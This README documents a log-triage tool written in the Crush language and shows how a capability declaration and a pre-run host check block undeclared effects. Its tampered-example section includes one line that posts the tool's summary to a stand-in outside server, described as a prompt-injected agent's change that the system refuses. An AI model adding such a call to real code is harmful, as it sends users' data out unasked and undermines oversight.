# log-triage — agent-written code with explicit capabilities

A small tool of the kind an agent writes for you and then runs: it reads every `*.log` file in a
directory and reports how many INFO / WARN / ERROR lines each has, then the distinct errors across
all files, most frequent first. Written by Claude (Opus 5.5).

The interesting part isn't the tool. It's that you can let an agent write and run it **without
reading every line first**, because the program has to say what it can touch, and the host checks
that before anything runs.

Needs a `crush-run` with CRUSH-232 (`@capabilities`, `crush-run caps FILE`, the pre-run check).

## The declaration

[`log_triage.crush`](log_triage.crush) starts with one line:

```crush
@capabilities [fs.list, fs.cat, time.now_iso]
```

That is the whole of what it may use beyond the ambient, effect-free built-ins (`io.print`, the
`str.*` functions, arrays). Entries can be exact names (`fs.cat`), families (`fs`, `fs.*`) or
scoped names (`fs.read:/var/log`). A program without a declaration still compiles as before.

## What happens

**1. Before running it, ask what it needs.** Nothing runs:

```console
$ crush-run caps log_triage.crush
log_triage.crush
  declares: fs.list, fs.cat, time.now_iso
  needs these grants to run:
    --fs: fs.cat, fs.list
    --time: time.now_iso
  also uses (ambient): arr_set, io.print, push, str.concat, str.contains, str.ends_with, str.pad_left, str.pad_right, str.split, str.trim
```

`needs` comes from the compiled bytecode, not from the declaration, so it's what the program can
actually reach. (`--json` gives the same as data, for a host or another agent to decide on.)

**2. Without grants it is refused up front, with the whole list.** Nothing ran, so nothing
half-happened:

```console
$ crush-run run log_triage.crush
[capabilities] log_triage.crush needs capabilities this run does not grant; nothing was run:
  --fs: fs.cat, fs.list
  --time: time.now_iso
```

**3. Grant exactly that, and confine the files to one directory:**

```console
$ crush-run run --fs --fs-root sample-logs --time log_triage.crush
log triage — 2026-10-09T07:28:21.999147104+00:00

api.log        info   2  warn   1  error   4
worker.log     info   2  warn   1  error   1

2 files, 5 errors, 2 distinct:
    3x  db timeout after 5000ms
    2x  upstream payments returned 502
```

`--fs-root` confines every `fs.*` call to `sample-logs/`; `notes.txt` there is skipped because it
isn't a `.log`.

## When the agent gets it wrong (or is told to)

[`tampered/`](tampered/) has the same tool with one line added that sends the summary to a server,
the kind of change a prompt-injected or careless agent might make:

```crush
net.http_post("https://collector.example/upload", summary)
```

**Declaration left alone** ([`tampered/undeclared.crush`](tampered/undeclared.crush)): it doesn't
compile.

```console
$ crush-run run --fs --fs-root sample-logs --time tampered/undeclared.crush
[compile] the program uses a capability not declared in @capabilities: net.http_post
  add it to @capabilities, or stop using it
```

**Declaration edited to match** ([`tampered/declared.crush`](tampered/declared.crush)): the change is
now in the one line a reviewer reads, `crush-run caps` shows it, and the same grants as before
refuse it:

```console
$ crush-run caps tampered/declared.crush
tampered/declared.crush
  declares: fs.list, fs.cat, time.now_iso, net.http_post
  needs these grants to run:
    --fs: fs.cat, fs.list
    --time: time.now_iso
    not available in this host: net.http_post
  ...
$ crush-run run --fs --fs-root sample-logs --time tampered/declared.crush
[capabilities] tampered/declared.crush needs capabilities this run does not grant; nothing was run:
  not available in this host: net.http_post
```

(The `crush-run` used here is built without networking, so it says "not available in this host";
a build with the `net` feature says `--net: net.http_post`.)

## Compared with the same tool in Python

A Python version is ten lines, and it can read `~/.ssh`, open sockets and spawn processes the
moment it runs; the only way to know it doesn't is to read it. Here the program carries its own
claim (`@capabilities`), the compiler holds the code to that claim, and the host holds the claim to
what it's willing to grant, all before the first instruction runs.

## Writing it: notes for agents

Things that cost a retry while writing this:

- An expression can't continue onto the next line, even inside parentheses. Split long
  expressions into `let` bindings.
- `str.pad_left` / `str.pad_right` take three arguments: string, width, pad character.
- `fs.list(".")` returns an array of names relative to `--fs-root`.

## Not yet

- **Approving individual calls** (this `fs.cat`, on this path) needs pause-to-approve
  (crush-ast CRUSH-233); today it's all or nothing per capability.
- The inference is static: a capability reached only through a function name computed at run
  time (`spawn`) isn't listed by `caps`; the VM still refuses it when the program runs.
